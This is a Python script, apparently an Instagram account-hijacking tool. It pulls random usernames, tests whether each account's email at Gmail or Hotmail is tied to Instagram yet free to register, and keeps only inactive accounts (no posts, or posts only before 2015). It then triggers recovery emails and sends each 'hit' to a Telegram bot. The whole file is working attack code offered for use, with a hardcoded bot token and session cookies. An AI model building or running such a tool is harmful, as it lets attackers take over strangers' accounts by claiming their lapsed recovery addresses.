from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
from urllib.parse import quote
from datetime import datetime

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        self.bad_date = 0
        
        # Hardcoded credentials
        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
        self.id = '7746909110'
        
        print("🚀 Bot starting on Render...")
        
        # Test Telegram connection
        print("Testing Telegram connection...")
        test_msg = "🚀 Bot started on Render! Searching for old accounts (No posts OR posts before 2015)"
        self.send_telegram(test_msg)
        print("✅ Telegram test sent!")
        time_module.sleep(2)
        
        # Get hotmail tokens
        while True:
            try:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                response = requests.get('https://signup.live.com/signup', headers=headers)
                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                self.amsc = response.cookies.get_dict()['amsc']
                
                cookies = {
                    'amsc': self.amsc,
                }
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                json_data = {
                    'clientExperiments': [
                        {
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': [
                                'enableplaintextforsignupexperiment_treatment',
                            ],
                        },
                    ],
                }
                response = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                ).json()
                self.canary = response['apiCanary']
                print("✅ Hotmail tokens obtained")
                break
            except Exception as e:
                print(f'Error getting hotmail tokens: {e}')
                time_module.sleep(5)
        
        # Start threads
        print("Starting search threads...")
        for _ in range(10):
            Thread(target=self.home, daemon=True).start()
        
        # Keep main thread alive
        try:
            while True:
                time_module.sleep(60)
                print(f"Status: 🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📅 Bad Date: {self.bad_date}")
        except KeyboardInterrupt:
            print("Bot stopped by user")
    
    def send_telegram(self, message):
        """Send message to Telegram with proper URL encoding"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                encoded_message = quote(message)
                url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    return True
                else:
                    print(f"Telegram error: {response.status_code}")
            except Exception as e:
                print(f"Telegram attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time_module.sleep(1)
        return False
    
    def insta1(self, email):
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36',
                'x-csrftoken': csrftoken,
            }
            data = {
                'username': email,
            }
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
            if 'showAccountRecoveryModal' in response:
                return True
            else:
                return False
        except:
            return False
    
    def insta2(self, email):
        try:
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Cookie': 'missing',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
            }
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data, timeout=10).text
            if 'bad_password' in re:
                return True
            else:
                return False
        except:
            return False
    
    def check_gmail(self, email):
        try:
            if '@' in email:
                email = email.split('@')[0]
            tim = (str(time()).split('.')[0])
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW;',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': generate_user_agent(),
                'x-same-domain': '1',
            }
            par = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
                'ddm': '0',
                'dsh': f'S-{tim}:1722139307145196',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
            }
            re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup', params=par, cookies=None, headers=headers, timeout=10)
            try:
                tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
            except:
                tok = ""
            
            data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
            params = {
                'TL': tok,
            }
            re = requests.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                cookies=None,
                headers=headers,
                data=data,
                timeout=10
            ).text
            if 'signup' in re:
                return True
            else:
                return False
        except Exception as e:
            return False
    
    def check_hotmail(self, email):
        try:
            cookies = {
                'amsc': self.amsc,
            }
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'canary': self.canary,
                'content-type': 'application/json; charset=utf-8',
                'origin': 'https://signup.live.com',
                'referer': 'https://signup.live.com/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }
            json_data = {
                'signInName': email,
            }
            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
            if '"isAvailable":true' in response:
                return True
            else:
                return False
        except Exception as e:
            return False
    
    def check_post_dates(self, username):
        """Check if account has NO posts OR all posts are before 2015"""
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
            }
            
            params = {
                'username': username,
            }
            
            response = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
                timeout=10
            ).json()
            
            posts = response.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('edges', [])
            
            if len(posts) == 0:
                # No posts is perfect - account is inactive
                return True, "No posts (inactive)"
            
            # Check if ANY post is from 2015 or later
            latest_year = 0
            for post in posts[:12]:  # Check first 12 posts
                timestamp = post.get('node', {}).get('taken_at_timestamp', 0)
                if timestamp > 0:
                    post_date = datetime.fromtimestamp(timestamp)
                    post_year = post_date.year
                    if post_year > latest_year:
                        latest_year = post_year
                    
                    # If any post is from 2015 or later, reject
                    if post_year >= 2015:
                        return False, f"Has post from {post_year}"
            
            return True, f"All posts before 2015 (latest: {latest_year})"
            
        except Exception as e:
            # If we can't check posts, assume it's okay
            return True, "Could not verify posts"
    
    def get_info(self, username, domen):
        try:
            # First check post dates
            posts_valid, posts_msg = self.check_post_dates(username)
            if not posts_valid:
                print(f"❌ Skipping {username} - {posts_msg}")
                self.bad_date += 1
                return False
            
            headers = {
                'X-Pigeon-Session-Id': str(uuid4()),
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
            }
            
            # Try to get email from recovery
            rest = None
            try:
                csrftoken = md5(str(time()).encode()).hexdigest()
                headers_recovery = {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                    'Accept': '*/*',
                    'Cookie': f'csrftoken={csrftoken}',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-CSRFToken': csrftoken,
                }
                data = {
                    'signed_body': f'SIGNATURE.{{"query":"{username}"}}',
                    'ig_sig_key_version': '4',
                }
                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                                        headers=headers_recovery, data=data, timeout=10)
                result = response.json()
                rest = result.get('email', None)
            except:
                pass
            
            # Get profile info
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': f'https://www.instagram.com/{username}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
            }
            params = {
                'username': username,
            }
            
            response = None
            try:
                response = requests.get(
                    'https://www.instagram.com/api/v1/users/web_profile_info/',
                    params=params,
                    headers=headers,
                    timeout=10
                ).json()
            except:
                pass
            
            id = None
            followerNum = None
            followingNum = None
            postNum = None
            isPraise = None
            full_name = None
            biography = None
            date = None
            
            if response:
                try:
                    id = response['data']['user']['id']
                    followerNum = response['data']['user']['edge_followed_by']['count']
                    followingNum = response['data']['user']['edge_follow']['count']
                    postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
                    isPraise = response['data']['user']['is_private']
                    full_name = response['data']['user']['full_name']
                    biography = response['data']['user']['biography']
                except:
                    pass
            
            # Try to get account creation date
            if id:
                try:
                    date_resp = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}', timeout=5).json()
                    date = date_resp.get('date', None)
                except:
                    pass
            
            info = f'''═══════════════════════════
🎯 HIT FOUND by PRIME! 🎯
═══════════════════════════
📧 Email: {username}@{domen}
👤 Username: {username}
🔗 Instagram: https://instagram.com/{username}
👥 Followers: {followerNum}
👣 Following: {followingNum}
📸 Posts: {postNum}
🔒 Private: {isPraise}
📅 Created: {date}
🆔 ID: {id}
📝 Name: {full_name}
💬 Bio: {biography}
📩 Recovery: {rest}
✅ Activity: {posts_msg}
═══════════════════════════
by: @m0hsvn'''
            
            print(info)
            
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n')
            
            self.send_telegram(info)
            return True
            
        except Exception as e:
            print(f"Error in get_info: {e}")
            return False
    
    def get_username(self):
        """Generate random username"""
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
                'x-ig-app-id': '936619743392459',
            }
            data = {
                'av': '17841408545457742',
                '__user': '0',
                '__a': '1',
                '__req': '53',
                'variables': '{"id":"' + str(randrange(1, 402149008)) + '","render_surface":"PROFILE"}',
                'doc_id': '7663723823674585',
            }
            username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data, timeout=10).json()['data']['user']['username']
            return [username]
        except Exception as e:
            return None
    
    def home(self):
        while True:
            try:
                # Get username
                usernames = None
                while usernames is None:
                    try:
                        usernames = self.get_username()
                    except:
                        time_module.sleep(0.5)
                
                for username in usernames:
                    sys.stdout.write(f'\r🎯 Hits: {self.hits} | ❌ Bad IG: {self.bad_instgram} | ✉️ Bad Email: {self.bad_email} | ✅ Good IG: {self.good_insgram} | 📅 Bad Date: {self.bad_date} | 🔍: {username}     \r')
                    sys.stdout.flush()
                    
                    # Check both Gmail and Hotmail
                    api1 = choice(['1', '2'])
                    api2 = choice(['1', '2'])
                    email1 = username + '@gmail.com'
                    email2 = username + '@hotmail.com'
                    
                    # Check Gmail
                    if '1' == api1:
                        s11 = self.insta1(email1)
                    else:
                        s11 = self.insta2(email1)
                    
                    if s11 == True:
                        self.good_insgram += 1
                        qq = self.check_gmail(email1)
                        if qq == True:
                            result = self.get_info(username, 'gmail.com')
                            if result:
                                self.hits += 1
                        else:
                            self.bad_email += 1
                    else:
                        self.bad_instgram += 1
                    
                    # Check Hotmail
                    if '2' == api2:
                        s22 = self.insta1(email2)
                    else:
                        s22 = self.insta2(email2)
                    
                    if s22 == True:
                        self.good_insgram += 1
                        qq = self.check_hotmail(email2)
                        if qq == True:
                            result = self.get_info(username, 'hotmail.com')
                            if result:
                                self.hits += 1
                        else:
                            self.bad_email += 1
                    else:
                        self.bad_instgram += 1
                    
                    # Small delay to avoid rate limiting
                    time_module.sleep(0.2)
                    
            except Exception as e:
                print(f"\nError in home: {e}")
                time_module.sleep(1)

if __name__ == '__main__':
    qredes()

